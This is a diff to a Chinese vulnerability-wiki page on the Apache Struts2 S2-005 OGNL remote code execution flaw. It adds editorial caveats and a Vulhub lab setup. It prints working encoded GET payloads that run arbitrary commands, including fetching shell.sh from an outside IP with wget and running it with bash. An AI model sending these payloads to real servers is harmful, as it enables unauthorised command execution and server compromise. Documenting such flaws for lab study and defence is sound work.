@@ -1,8 +1,52 @@
 ---
 source: "Threekiii/Vulnerability-Wiki"
+title: "Apache Struts2 S2-005 远程代码执行漏洞"
+product: "Apache Struts2 ParametersInterceptor / OGNL"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "S2-005"
+referenced_identifiers: ""
+identifier_role: "primary"
+prerequisites: "2.0.0–2.1.8.1，OGNL参数名求值与可改安全配置；URL特殊字符须保真"
+source_status: "unknown"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
+id: "vw-b16f622846e1ec2330d9f7e2"
+entity_id: "ve-b16f622846e1ec2330d9f7e2"
+schema_version: "1"
 ---
 
 # Apache Struts2 S2-005 远程代码执行漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：2.0.0–2.1.8.1，OGNL参数名求值与可改安全配置；URL特殊字符须保真
+- 证据范围：说明S2-003→005修复链、编码差异与无回显验证，保留机制解释。
+
+### 本次正文校订
+
+- 按实际内容修正 6 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- S2-003历史条件应作为关联而非主漏洞范围；缺主CVE/修复版本
+- 将参数键值全部解析成Java语句是教学简化，应区分OGNL属性绑定与任意表达式
+- (aaa)(bbb)=true等价aaa=true的描述作者也承认未确定，不能当正式语义结论
+- 下载文件cwd与固定Tomcat路径前提未列，修改沙箱/文件状态需披露
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 ## 漏洞描述
 
@@ -37,7 +81,7 @@ action.getUser().setFavoriteDrink("kumys")
 
 Vulhub 执行以下命令启动 s2-005 测试环境：
 
-```
+```shell
 docker-compose build
 docker-compose up -d
 ```
@@ -46,7 +90,7 @@ docker-compose up -d
 
 执行任意命令 POC（无回显，空格用 `@` 代替）：
 
-```
+```http
 GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/awesome_poc%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
 Host: target:8080
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36
@@ -80,25 +124,25 @@ python3环境下：python -m http.server 80
 
 上传 shell.sh 文件的命令为：
 
-```
+```shell
 wget 192.168.174.128/shell.sh
 ```
 
 上传 shell.sh 文件的 Payload 为：
 
-```
+```http
 GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22wget@192.168.174.128/shell.sh%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
 ```
 
 执行 shell.sh 文件的命令为：
 
-```
+```shell
 bash /usr/local/tomcat/shell.sh
 ```
 
 执行 shell.sh 文件的 Payload 为：
 
-```
+```http
 GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22bash@/usr/local/tomcat/shell.sh%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
 ```
 
